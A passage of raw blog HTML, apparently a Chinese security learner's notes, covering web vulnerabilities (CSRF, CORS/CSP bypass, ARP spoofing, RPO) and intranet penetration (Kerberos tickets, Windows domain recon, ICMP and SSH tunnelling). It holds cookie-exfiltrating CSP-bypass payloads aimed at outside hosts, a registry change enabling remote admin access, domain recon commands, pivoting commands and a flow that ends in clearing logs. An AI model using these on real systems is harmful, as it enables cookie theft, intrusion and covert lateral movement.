alt="image-20250202222352186"></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h2><ul><li>攻击管理员</li><li>修改账号密码</li><li>劫持用户</li><li>CSRF蠕虫</li><li>拖库</li><li>路由器攻击</li></ul><h2 id="防护-4"><a href="#防护-4" class="headerlink" title="防护"></a>防护</h2><p>前端</p><ol><li>避免get操作</li><li>spa验证（从cookie中读取token并验证)</li><li><strong>二次验证</strong></li></ol><p>后端</p><ol><li><strong>检测referer origin头</strong></li><li><strong>csrf token</strong></li></ol><p>浏览器</p><ol><li><p><strong>SOP策略</strong> （同源策略，限制不同协议 域名 端口不可以传递cookie但是会被&lt;form&gt;表单，&lt;img&gt;&lt;script&gt;绕过）</p></li><li><p><strong>SameSite策略</strong>（lax strict none）</p><p>&#x2F;&#x2F;CORS策略（跨域资源共享，设置哪些跨域请求可以允许,只能限制读取响应)</p></li></ol><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20250202222535855.png" alt="image-20250202222535855d"></p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20250202222554191.png" alt="image-20250202222554191"></p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20250202222609693.png" alt="image-20250202222609693"> </p><h1 id="其他-2"><a href="#其他-2" class="headerlink" title="其他"></a>其他</h1><h2 id="DOS类"><a href="#DOS类" class="headerlink" title="DOS类"></a>DOS类</h2><p>ACK UDP ICMP FLOOD CC</p><p>CC攻击：针对web页面的</p><p>LAND攻击：源和请求地址相同</p><p>SYN Flood：发送大量syn请求握手包</p><h2 id="CORS-SOP-CSP"><a href="#CORS-SOP-CSP" class="headerlink" title="CORS,SOP,CSP"></a>CORS,SOP,CSP</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">SOP用来防护csrf，限制了跨域交互，在他的基础上补充了CORS<br>CSP用来防护XSS漏洞<br></code></pre></td></tr></table></figure><p>相比JSONP只能发GET请求，CORS允许任何类型的请求。 CORS请求大致和ajax请求相同，但是在头信息中加上了Origin字段表明请求来自哪个源。如果orgin是许可范围之内的话，服务器返回的响应会多出<code>Acess-Control-Allow-*</code>的字段</p><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">跨域资源共享 CORS 详解 - 阮一峰的网络日志 (ruanyifeng.com)</a></p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20250226194036241.png" alt="image-20250226194036241"></p><p>CORS，JSONP，Websocket都可以用来绕过SOP策略</p><p>sop<strong>不限制ip 限制的是域名 端口 协议</strong></p><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627173039773.png" alt="image-20240627173039773"></p><h2 id="绕过csp"><a href="#绕过csp" class="headerlink" title="绕过csp"></a>绕过csp</h2><ul><li>宽松的default-src</li><li>过多的unsafe-inline unsafe-eval</li><li>不安全的域名</li><li>jsonp注入</li><li>跨域</li><li>dom注入</li></ul><p>url跳转</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">不允许内联脚本 利用meta <span class="hljs-keyword">refresh</span><br>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;<br>允许内联脚本<br><span class="hljs-keyword">window</span>.<span class="hljs-keyword">location</span>=&quot;http://eval.php?c=cookie&quot;<br><span class="hljs-keyword">window</span>.<span class="hljs-keyword">location</span>.href=&quot;http://baidu.com&quot;; <br><span class="hljs-keyword">window</span>.<span class="hljs-keyword">location</span>.replace(&quot;http://baidu.com&quot;)<br>允许eval<br>eval(String.fromCharCode(<span class="hljs-number">100</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">117</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">97</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">111</span>, <span class="hljs-number">110</span>, <span class="hljs-number">61</span>, <span class="hljs-number">34</span>, <span class="hljs-number">104</span>, <span class="hljs-number">116</span>, <span class="hljs-number">116</span>, <span class="hljs-number">112</span>, <span class="hljs-number">58</span>, <span class="hljs-number">47</span>, <span class="hljs-number">47</span>, <span class="hljs-number">98</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">100</span>, <span class="hljs-number">117</span>, <span class="hljs-number">46</span>, <span class="hljs-number">99</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">34</span>))<br></code></pre></td></tr></table></figure><p>dns预加载</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=<span class="hljs-string">&quot;dns-prefetch&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;//[some thing].xxxx.ceye.io&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>link prefetch</p><p>标签补全</p><h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627173143109.png" alt="image-20240627173143109"></p><h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><p>发送虚假的ARP消息到局域网，让其他机器将不属于攻击者的IP绑定到攻击者MAC地址上从而拦截数据包</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>静态arp</p><p>arp防护工具</p><p>网络隔离和访问控制</p><h2 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627173121507.png" alt="image-20240627173121507"></p><p><img src="/" alt="img"></p><h2 id="x-frame-option"><a href="#x-frame-option" class="headerlink" title="x-frame-option"></a>x-frame-option</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627173049155.png" alt="image-20240627173049155"></p><h2 id="RPO"><a href="#RPO" class="headerlink" title="RPO"></a>RPO</h2><p><img src="/2024/06/27/top10%E6%BC%8F%E6%B4%9E/image-20240627173814941.png" alt="image-20240627173814941"></p><p>对于a目录下的apache.php和nginx.php</p><p>访问a&#x2F;..%2f&#x2F;apache报404错误，但是nginx可以访问</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>（服务器可以识别..%2f但是浏览器不行，所以..%2f可以在url中跨目录访问index.php。但是在解析js脚本路径的时候无法穿越目录，也就导致了可以<strong>利用&#x2F;a..%2f..%2f..%2fTEST.php来运行根目录下的php文件同时包含a目录下的js</strong>）</p>]]></content>
    
    
    <categories>
      
      <category>web知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>top10</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透</title>
    <link href="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <url>/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>安全选项中的“以管理员批准模式运行所有管理员”</p><p>LocalAccountTokenFilterPolicy</p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>Administrator和本地管理员都属于administrator组,但是由于UAC,本地管理员部分命令需要使用“以管理员身份运行”</p><p>System权限大于Administrator，部分注册表需要System</p><p>本地无法查询组信息的时候可以用Incognito获取System</p><h2 id="密码相关"><a href="#密码相关" class="headerlink" title="密码相关"></a>密码相关</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104453066.png" alt="image-20240819104453066"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240817201648187.png" alt="image-20240817201648187"></p><p>Ntds.dit：域控下才有，包含域用户，组合组成员，凭据，gpp，被注册表下的密钥对加密的用户hash（破解需要导出system.hive文件）等信息，位于%SystemRoot%\ntds\ntds.di</p><p>sam：工作组环境中存储用户密码</p><p>ntdsutil ：卷影拷贝服务工具，建立以上被windwos锁定的二者的快照以后面抓取</p><p>NTFS：微软专用的文件系统</p><p>DCSync：通过域同步服务的GetNCChanges接口获得完整的域用户Hash列表。</p><p>所有dump密码都是围绕着</p><ul><li>Lsass内存Dump</li><li>NTDS文件解密</li><li>域同步获取hash</li></ul><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>结构 username:RID:LM-HASH:NTLM-HASH:LM Hash:DES，</p><p>如果要停止使用 LM Hash,<strong>将用户的密码设置为 14 位以内，</strong> “ab35454a3435451404046” (表示 LMHash 为空值或被禁用)。</p><p>2008 开始默认禁用，个人版从 Windows Vista 以后，服务器版从 Wndows Sever 2003 后使用 NTLM Hash</p><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>将服务实例和服务登录账号关联起来，</p><h3 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h3><p>WindowsServer 2012 R2</p><p>建立了ProtectedUsers组，强制使用kerberos验证以实施AES加密，注销了LSASS的明文凭证</p><h3 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h3><p><a href="https://hackerqwq.github.io/2021/06/28/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%9C%E7%94%A8">内网渗透之kerberos协议学习及攻击方法总结 · HacKerQWQ’s Studio</a></p><p>（走kerberos协议的时候必须通过域名去连接）</p><p>对于域内账户</p><p>1.当 Client 想要访问 Server 上的某个服务时,需要先向 AS 证明自己的身份（Clinet hash加密的时间戳），验证通过后 AS 会发放一个 （krbtgt hash加密）的TGT</p><p>2.随后 Client 再次向 TGS 证明自己的身份（解密TGT验证），验证通过后获得 TGS （也就有了ST）</p><p>3.最后Client用TGS去请求服务，解密成功时服务得到PAC，发送到KDC检查Client是否有相应权限</p><p>这个过程分为三块：<br><strong>Client 与 AS 的交互,</strong>–获取TGT（krbtgt NTLM Hash加密）</p><p><strong>Client 与 TGS 的交互,</strong>–获得TGS（带有ST 由服务账号NTLM Hash加密）</p><p><strong>Client 与 Server 的交互。</strong></p><p><strong>黄金票据是伪造 TGT，白银票据则是伪造 ST</strong></p><p><strong>一个获得通用的身份，一个获得访问服务的权限</strong></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/TnjRbqFw6obmhJx2CbZc7irynwe.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250211161847695.png" alt="image-20250211161847695">应该说是TGT不直接和AS交互，而是直接用来访问服务</p><h3 id="LocalAccountTokenFilterPolicy"><a href="#LocalAccountTokenFilterPolicy" class="headerlink" title="LocalAccountTokenFilterPolicy"></a>LocalAccountTokenFilterPolicy</h3><p>组环境下，<code>Windows Vista</code>以后的操作系统中，注册表中默认没有这个值，当administrator之外的用户连接得到删除管理员凭证的令牌导致无法连接</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></code></pre></td></tr></table></figure><p>通过以上命令添加</p><h2 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h2><p><strong>两台计算机间的通信</strong>，其实是两台计算机中应用程序（进程）与应用程序（进程）间的通信。但“IP 地址”仅能定位到计算机，如何定位到应用程序（进程）呢？答案是“协议 + 端口”。<br>如果你对同源策略有所了解就能马上反应过来，这就是 IP + 协议 + 端口<br><strong>Socket</strong> 就是一个类，封装了许多功能函数，当需要建立连接进行通信时，它会先进行初始化，然后通过内置的功能函数建立连接并完成通信（打开、读&#x2F;写 IO、关闭），其中就包含了 TCP 的三次握手。<br><strong>正向代理和反向代理</strong>本质上并无区别，正向代理即客户端代理，代理客户端，服务端不知道实际发起请求的客户端。反向代理即服务端代理，代理服务端，客户端不知道实际提供服务的服务端。<br>正向代理可以隐藏用户的信息，并能够将其作为跳板访问我们无法访问的资源，如翻墙。反向代理可以隐藏服务器的信息，保障了内网的安全，同时能够用来实现<strong>负载均衡</strong>。（负载均衡也是防御 DOS 攻击的一种方式），对于反向代理而言，客户端不知道请求的目标主机真正 ip<br>在<strong>地址转换与端口映射</strong>中，<code>静态NAT</code> 是路由器上手动配置，一个内网地址和一个公网地址相关联，一一对应。<code>动态NAT</code> 是路由器上配置一个公网 IP 地址池，当内网地址访问外网时从地址池里获取公网 IP 进行映射。当公网 IP 地址池分配完时，只能等待被占用的公网 IP 被释放后，其他主机才能获取公网 IP 访问公网。这种将源地址进行转换的方式也可称之为 SNAT（源地址转换）。<code>NAPT 网络地址端口转换</code> 是允许多个内网地址映射到同一个公网 IP 的不同端口。这种将源地址和端口进行转换的方式也可称之为 SNAPT（源地址端口转换）。<br><strong>端口转发</strong>，有时被叫做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的 NAT 方式访问外网。<br><strong>内网穿透</strong>是当想要访问内部网络但又没有权限去操作防火墙做端口映射的情况的时候，就需要搭建一条隧道来做端口转发和流量转发。<br><strong>正向 socks</strong>：当一个机器同时存在内外网 IP 时就能在外网通过正向连接去访问其它内网机器，而且这里跳板机就相当于正向代理。因为对于攻击者来说它是可知的，而对于内网机来说，它们并不知道它们返回给跳板机的响应又被发送给了攻击者。</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/HwexbH3zSoSMVXxXSwmckufunqh.png" alt="截图"></p><p><strong>反弹 socks</strong>：当目标机器没有公网 IP，但可访问内网资源时。攻击者可以在内网跳板机上运行 EarthWorm 使其反弹到某台对外连接的内网服务器上，然后攻击者再通过外网连接到对外服务器进而进入到内网中。这里公网服务器既是正向代理也是反向代理。对于攻击者来说它是可知的，因为我们要通过它访问我们无法访问的资源；对于内网服务器（跳板机）来说它也是可知的，因为我们是在内网服务器（跳板机）上执行的反弹命令，使其反向连接到公网服务器上。而内网服务器（跳板机）在这里充当的仅是公网服务器的正向代理，因为它对于公网服务器来说是可知的，而对于其他内网机来说则是不可知的。</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MC39bEdL9oVcAnx4WIXcLKjYnV5.png" alt="截图"></p><p>主机用户：活动目录中的主机，也叫机器用户</p><p>服务账户：将服务运行起来并加入域时用到的账户，例如 mysql 账户</p><h2 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h2><p>将域内用户账户的权限给予服务账户</p><h3 id="非约束性"><a href="#非约束性" class="headerlink" title="非约束性"></a>非约束性</h3><p>服务用户获得了用户的 TGT，获得了该用户所有的访问权限</p><p>1.域控默认配置</p><p>2.需要 SeEnableDelegationPrivilege 特权，该特权默认仅授予域管理员和企业管理员</p><h3 id="约束性"><a href="#约束性" class="headerlink" title="约束性"></a>约束性</h3><p>只获取了 ST，只能访问特定服务</p><p>分类</p><ol><li>仅使用 Kerberos，不能进行协议转换</li><li>使用任何身份验证协议</li></ol><h3 id="基于资源的约束性"><a href="#基于资源的约束性" class="headerlink" title="基于资源的约束性"></a>基于资源的约束性</h3><h2 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h2><p>利用广播和 respondor</p><p>windows 解析主机名：查看本地 hosts – 查看 DNS 缓存和服务器 – 利用 LLMNR 或者 netbios</p><p>当内网中没有 dns 协议的时候，广播协议降级为 LLMN2 或者 netbios</p><p>可以构造一个 scf 恶意文件，触发降级的广播协议，respondor 截取到 ntlm hash</p><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><ol><li><p>打点拿下跳板机</p></li><li><p>net user &#x2F;domain 确认位置，寻找存活主机</p></li><li><p>提权，提取 hash</p></li><li><p>横向移动，拿下更多机子以及定位 dc 位置</p></li><li><p>提权域管，拿下 dc 后提权</p></li><li><p>PTT 维权，清理日志</p></li></ol><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="外网部分"><a href="#外网部分" class="headerlink" title="外网部分"></a>外网部分</h2><ul><li><p>whois查询</p></li><li><p>备案号</p></li><li><p>c段 旁站</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">c</span>段：可以通过在线网站记录或者暴力扫描<br>旁站：同一服务器但是不同站点，需要定位资产，在线网站查询<br></code></pre></td></tr></table></figure></li><li><p>绕过CDN查真实ip</p><p>首先cc.chinaz查CDN供应商</p><p>然后历史记录，多地区ping等绕过</p></li><li><p>二级域名</p><p>爆破，dns解析…</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20250210160754338.png" alt="image-20250210160754338"></p></li><li><p>数字证书</p><p>crt.sh</p></li><li><p>商业信息：企查查..</p></li><li><p>社交媒体，用户名，邮件收集..</p><p>rocketreach</p><p>sherlock，maigre，whatsmyname.app</p><p>hunter.io，phoneboock.cz，omail.io，skymem.info</p></li><li><p>源码查询</p><p>gitdocker，searchcode</p></li><li><p>网站icon</p></li><li><p>密码泄露</p><p>intelx.io(文件),cirt.net，default-password.info,routerpasswords(设备)，</p></li><li><p>网站架构：服务器版本，中间件，框架，数据库版本，waf</p></li></ul><h2 id="判断靶标系统"><a href="#判断靶标系统" class="headerlink" title="判断靶标系统"></a>判断靶标系统</h2><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><p>windows 不敏感</p><h3 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h3><p>Ping windows 一般 ttl 大于 100</p><h2 id="脆弱端口"><a href="#脆弱端口" class="headerlink" title="脆弱端口"></a>脆弱端口</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Ae1bbTMIMoAuUfxHsLZc1V4knlc.png" alt="截图"></p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104247117.png" alt="image-20240819104247117"></p><p>• 网络链接、进程、计划任务（crontab rc.d systemd）、凭证信息(shadow、私钥)、命令记录、管理员来源、hosts文件</p><p>• 用户目录、opt目录、根目录</p><p>• *.history (.bash_history .mysql_history)</p><p>• &#x2F;proc&#x2F;self&#x2F;*</p><p>• env</p><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104348776.png" alt="image-20240819104348776"></p><p>localgroup administrators  本地管理员</p><p>domain admins 域管理员</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> 网络配置 ipconfig /<span class="hljs-keyword">all</span> <br> <span class="hljs-number">2.</span> 操作系统 systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; <br> <span class="hljs-number">3.</span> 软件信息 systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; <br> <span class="hljs-number">4.</span> 服务信息 wmic /namespace:\root\securitycenter2 pathantivirusproduct <span class="hljs-keyword">GET</span> displayName,productState,pathToSignedProductExe <br> <span class="hljs-number">5.</span> 用户列表 net <span class="hljs-keyword">user</span> <br> <span class="hljs-number">6.</span> 本地管理员信息 net localgroup administrators <br> <span class="hljs-number">7.</span> 端口信息 netstat –ano <br> <span class="hljs-number">8.</span> 补丁信息 wmic qfe <span class="hljs-keyword">get</span> Caption,Description,HotFixID,InstalledOn <br> <span class="hljs-number">9.</span> 查防火墙 netsh firewall <span class="hljs-keyword">show</span> config <br> 【域内信息收集】 <br> <span class="hljs-number">1.</span>是否有域：使用ipconfig /<span class="hljs-keyword">all</span>命令可以查看网关IP地址、DNS的IP地址以及判断当前主机 <br> <span class="hljs-number">2.</span>是否在域内：通过反向解析查询命令nslookup来解析域名的IP地址，使用解析出来的IP地址进行对比，判断域控制器和 DNS服务器是否在同一台服务器上 <br> <span class="hljs-number">3.</span>登录域信息：net config workstation <br> <span class="hljs-number">4.</span>ICMP探测内网：<span class="hljs-keyword">for</span> /L %I <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) <span class="hljs-keyword">DO</span> @ping -w <span class="hljs-number">1</span> -n <span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.174</span>.%I | findstr &quot;TTL=&quot; <br> <span class="hljs-number">5.</span>查询域信息：net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">6.</span>查询域主机：net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span>:XXX <br> <span class="hljs-number">7.</span>查询域用户：net <span class="hljs-keyword">group</span> /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">8.</span>查找域控：Nslookup -<span class="hljs-keyword">type</span>=SRV _ldap._tcp net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span> net <span class="hljs-keyword">group</span> &quot;Domain Controllers&quot; /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">9.</span>查域用户信息：net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">11.</span>查询域管理员：net <span class="hljs-keyword">group</span> &quot;Domain Admins&quot; /<span class="hljs-keyword">domain</span> <br> <span class="hljs-number">12.</span>查询域sid信息：whoami /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><p>• 网络链接、进程、凭证信息(hash、明文)、管理员来源、用户信息、组信息、共享</p><p>• 用户目录、 downlaod、desktop、document、recent</p><p>• 程序目录 ProgramData 、appdata（roaming、local）</p><p>• Wmic 命令系列</p><p>• Net 命令系列</p><p>• %windir%\system32*.exe</p><h1 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h1><blockquote><p><a href="https://www.freebuf.com/articles/web/269523.html">https://www.freebuf.com/articles/web/269523.html</a><br><a href="https://xz.aliyun.com/t/12498?time__1311=mqmhD5AKYKBKDKG=D/zTy8=8E54Qq+D&alichlgref=https://cn.bing.com/#toc-2">https://xz.aliyun.com/t/12498?time__1311&#x3D;mqmhD5AKYKBKDKG%3DD%2FzTy8%3D8E54Qq%2BD&amp;alichlgref&#x3D;https%3A%2F%2Fcn.bing.com%2F#toc-2</a></p></blockquote><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><strong>frp、ew、ssh、Neo-reGeorg、netsh、Lcx</strong><br>网络层：Ipv6 情况、icmp 情况、Gre 隧道<br>传输层：Tcp 隧道、udp 隧道 常规端口转发<br>应用层：ssh 隧道、http 隧道、https 隧道、dns 隧道</p><h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>TCP&#x2F;UDP 协议：nc -zv  nc -zvu(u 为 udp)</p><p>HTTP 协议： curl wget</p><p>ICMP 协议： ping</p><p>DNS 协议： nslookup 或者 dig @ip</p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h3 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h3><p>Pingtunnel：将 tcp&#x2F;udp&#x2F;sock5 流量伪装为 icmp</p><p>服务器上开启服务</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo ./pingtunnel -<span class="hljs-keyword">type</span> <span class="hljs-type">server </span>-key [密钥,只限数字]<br></code></pre></td></tr></table></figure><p>客户端上连接服务器</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pingtunnel<span class="hljs-selector-class">.exe</span> -type client -l :<span class="hljs-selector-attr">[转发本机2222端口作为ICMP隧道通讯端口]</span> -s <span class="hljs-selector-attr">[服务端IP]</span> -<span class="hljs-selector-attr">[转发类型]</span> <span class="hljs-number">1</span> -noprint <span class="hljs-number">1</span> -nolog <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ICMP转发为TCP<br>pingtunnel<span class="hljs-selector-class">.exe</span> -type client -l :<span class="hljs-number">4455</span> -s www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span> -t www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">4455</span> -tcp <span class="hljs-number">1</span><br>ICMP转发为UDP<br>pingtunnel<span class="hljs-selector-class">.exe</span> -type client -l :<span class="hljs-number">4455</span> -s www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span> -t www<span class="hljs-selector-class">.yourserver</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">4455</span><br></code></pre></td></tr></table></figure><h3 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h3><p>dnscat2，原理：将数据通过 DNS 协议传输，需要一个独立的子域名通信，需要配置子域名后开放 udp，tcp53 端口，添加 A 记录和 NS 记录</p><h3 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH 隧道"></a>SSH 隧道</h3><h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h4><p>1.修改攻击机和跳板机 ssh 配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">攻击机<br>vi /etc/ssh/sshd_config<br>--GatewayPorts no改成<span class="hljs-built_in">yes</span>并且去掉注释<br>systemctl restart sshd.service<br>跳板机<br>AllowTcpForwarding <span class="hljs-built_in">yes</span>          <span class="hljs-comment"># 允许转发TCP协议</span><br>GatewayPorts <span class="hljs-built_in">yes</span>                <span class="hljs-comment"># 允许远程主机连接本地转发端口</span><br>PermitRootLogin <span class="hljs-built_in">yes</span>             <span class="hljs-comment"># 允许root登录</span><br>TCPKeepAlive <span class="hljs-built_in">yes</span>                <span class="hljs-comment"># 保持心跳，防止ssh断开</span><br>systemctl restart sshd.service<br></code></pre></td></tr></table></figure><ol start="2"><li></li></ol><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">ssh -CfNg -L <span class="hljs-comment">[本机端口]</span>:<span class="hljs-comment">[隧道访问的内网主机]</span>:<span class="hljs-comment">[隧道访问的内网主机端口]</span> <span class="hljs-comment">[双网卡跳板机SSH连接命令]</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/HGuhbdOYboOamKxD4rFcdGyPnEd.png" alt="截图"></p><ol start="3"><li></li></ol><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">检查跳板机端口工作状态<br>netstat -tulnp <span class="hljs-string">| grep 端口</span><br></code></pre></td></tr></table></figure><ol start="4"><li></li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">本机连接跳板机端口（ssh填内网机器）<br>ssh -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8888</span> root<span class="hljs-keyword">@127</span>.0.0.1<br></code></pre></td></tr></table></figure><h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" 